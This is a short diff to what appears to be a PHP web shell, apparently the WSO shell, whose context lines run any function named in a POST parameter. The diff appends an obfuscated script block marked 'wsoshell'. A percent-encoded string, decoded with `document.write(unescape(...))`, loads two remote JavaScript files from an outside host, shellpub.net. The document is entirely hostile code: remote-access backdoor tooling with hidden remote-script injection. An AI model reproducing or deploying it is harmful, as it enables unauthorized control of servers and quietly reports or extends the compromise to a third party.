@@ -1622,3 +1622,7 @@ if( empty($_POST['a']) )
 if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
     call_user_func('action' . $_POST['a']);
 ?>
+<script type="text/javascript">
+<!-- wsoshell -->
+document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%68%74%74%70%73%3A%2F%2F%73%68%65%6C%6C%70%75%62%2E%6E%65%74%2F%67%65%74%2E%6A%73%3E%3C%2F%73%63%72%69%70%74%3E%0A%3C%73%63%72%69%70%74%20%73%72%63%3D%68%74%74%70%73%3A%2F%2F%73%68%65%6C%6C%70%75%62%2E%6E%65%74%2F%73%61%79%61%63%2E%6A%73%3E%3C%2F%73%63%72%69%70%74%3E'));
+</script>
